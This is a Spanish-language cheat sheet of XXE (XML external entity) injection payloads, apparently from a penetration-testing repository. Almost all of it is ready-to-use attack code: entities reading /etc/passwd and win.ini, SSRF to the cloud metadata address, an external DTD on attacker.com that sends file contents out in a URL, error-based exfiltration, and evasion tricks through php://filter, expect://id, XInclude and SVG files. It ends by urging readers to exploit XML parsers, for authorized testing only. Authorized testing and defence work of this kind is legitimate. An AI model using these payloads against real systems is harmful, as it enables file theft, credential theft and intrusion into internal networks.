# 📄 XXE: inyección de entidades externas XML

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)


> **Terminología y límites:** Una DTD define entidades y estructura; blind XXE significa que el resultado no aparece directamente en la respuesta y OOB, comunicación fuera de banda. Los payloads se conservan como fragmentos ilustrativos. Cambiar la declaración a UTF-16 no convierte los bytes del documento a esa codificación. Las entidades de parámetro anidadas tienen restricciones en la DTD interna, por lo que el ejemplo de exfiltración por errores puede requerir otro contexto de DTD ([PortSwigger](https://portswigger.net/web-security/xxe/blind)). `expect://` requiere la extensión Expect de PHP y no está activado de forma predeterminada ([manual de PHP](https://www.php.net/manual/en/wrappers.expect.php)). XInclude y los wrappers dependen de la configuración del procesador. Los dos documentos del bloque SSRF son ejemplos separados.


```
  ██╗  ██╗██╗  ██╗███████╗
  ╚██╗██╔╝╚██╗██╔╝██╔════╝
   ╚███╔╝  ╚███╔╝ █████╗  
   ██╔██╗  ██╔██╗ ██╔══╝  
  ██╔╝ ██╗██╔╝ ██╗███████╗
  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
   Inyección de entidades externas XML
```

---

## 🎯 Qué es XXE

**XXE** aprovecha los analizadores XML que procesan referencias a entidades externas, lo que permite leer archivos, realizar SSRF (falsificación de solicitudes del lado del servidor) y, en algunos casos, ejecutar código de forma remota (RCE).

---

## 💉 Payloads básicos

### Leer archivos locales
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Archivos de Windows
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

### SSRF mediante XXE
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/">
]>
<root>&xxe;</root>
```

---

## 🔒 XXE ciego (fuera de banda)

### DTD externa
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**evil.dtd en el servidor del atacante:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### Exfiltración basada en errores
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

---

## 🛡️ Técnicas de evasión

### Codificación
```xml
<!-- UTF-16 -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- Envuelto en Base64 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### Variantes de protocolo
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "data://text/plain,test">
```

### XInclude
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### SVG XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>
```

---

## 📊 Referencia rápida

| Tipo de payload | Uso |
|--------------|----------|
| Lectura de archivos | `SYSTEM "file:///etc/passwd"` |
| SSRF | `SYSTEM "http://internal/"` |
| Ciego (OOB) | DTD externa y exfiltración |
| Basado en errores | Provocar un error que incluya los datos |

### Endpoints habitualmente vulnerables
```
- API SOAP
- Carga de archivos XML
- Procesadores de SVG
- Analizadores de documentos (DOCX, XLSX)
- Fuentes RSS/Atom
```

---

## 📚 Recursos

- [PortSwigger XXE](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

---

<p align="center">
  <b>📄 ¡Explota los analizadores XML!</b><br>
  <i>¡Solo para pruebas autorizadas!</i>
</p>
